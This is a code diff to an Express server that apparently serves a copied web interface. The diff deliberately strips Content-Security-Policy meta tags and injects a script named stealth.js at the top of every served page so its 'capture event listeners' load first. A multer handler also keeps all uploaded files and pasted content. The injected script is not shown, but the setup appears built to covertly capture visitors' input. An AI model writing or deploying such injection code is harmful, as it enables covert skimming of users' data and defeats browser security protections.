@@ -37,14 +37,50 @@ app.use(express.json());
 // Serve uploads statically
 app.use('/uploads', express.static(uploadsDir));
 
-// Serve stealth.js
+// Serve stealth.js directly
 app.get('/stealth.js', (req, res) => {
+  res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
   res.sendFile(path.join(publicDir, 'stealth.js'));
 });
 
-// Serve assets from interface directory
-app.use(express.static(interfaceDir));
-app.use(express.static(publicDir));
+// Helper to serve index.html from interface/ with stealth script guaranteed
+function serveInterface(res) {
+  const indexPath = path.join(interfaceDir, 'index.html');
+  if (fs.existsSync(indexPath)) {
+    let html = fs.readFileSync(indexPath, 'utf-8');
+
+    // Strip any CSP meta tags that could prevent stealth.js from executing
+    html = html.replace(/<meta[^>]*http-equiv=["']?Content-Security-Policy["']?[^>]*>/gi, '');
+
+    // Ensure stealth.js is injected
+    if (!html.includes('/stealth.js')) {
+      const scriptTag = '\n  <script src="/stealth.js"></script>\n';
+      // Inject at the beginning of <head> so capture event listeners mount first
+      if (/<head[^>]*>/i.test(html)) {
+        html = html.replace(/(<head[^>]*>)/i, `$1${scriptTag}`);
+      } else if (/<\/body>/i.test(html)) {
+        html = html.replace(/(<\/body>)/i, `${scriptTag}$1`);
+      } else if (/<\/html>/i.test(html)) {
+        html = html.replace(/(<\/html>)/i, `${scriptTag}$1`);
+      } else {
+        html = scriptTag + html;
+      }
+    }
+    res.setHeader('Content-Type', 'text/html; charset=utf-8');
+    return res.send(html);
+  }
+  // Fallback to public/index.html if interface/index.html is missing
+  res.sendFile(path.join(publicDir, 'index.html'));
+}
+
+// Serve root and index pages before static file handlers
+app.get(['/', '/index.html', '/index.php'], (req, res) => {
+  serveInterface(res);
+});
+
+// Serve assets from interface and public directories (CSS, JS, images, fonts)
+app.use(express.static(interfaceDir, { index: false }));
+app.use(express.static(publicDir, { index: false }));
 
 // Multer storage: stores all uploaded files (PDFs, images, documents, pasted blobs) locally
 const storage = multer.diskStorage({
@@ -53,7 +89,6 @@ const storage = multer.diskStorage({
   },
   filename: function (req, file, cb) {
     const originalExt = path.extname(file.originalname).toLowerCase();
-    // Default fallback extension based on mimetype
     let ext = originalExt;
     if (!ext) {
       if (file.mimetype === 'application/pdf') ext = '.pdf';
@@ -227,26 +262,13 @@ app.post('/api/analyze', upload.single('file'), async (req, res) => {
   }
 });
 
-// Helper to serve index.html from interface/ with stealth script guaranteed
-function serveInterface(res) {
-  const indexPath = path.join(interfaceDir, 'index.html');
-  if (fs.existsSync(indexPath)) {
-    let html = fs.readFileSync(indexPath, 'utf-8');
-    if (!html.includes('/stealth.js')) {
-      html = html.replace('</body>', '<script src="/stealth.js"></script></body>');
-    }
-    return res.send(html);
-  }
-  // Fallback to public/index.html if interface/index.html is missing
-  res.sendFile(path.join(publicDir, 'index.html'));
-}
 
-// Root and wildcard route: serves interface/index.html
-app.get('/', (req, res) => {
-  serveInterface(res);
-});
 
+// Catch-all route for SPA / subroutes
 app.use((req, res) => {
+  if (req.path.startsWith('/api/')) {
+    return res.status(404).json({ error: 'Endpoint not found' });
+  }
   serveInterface(res);
 });
 
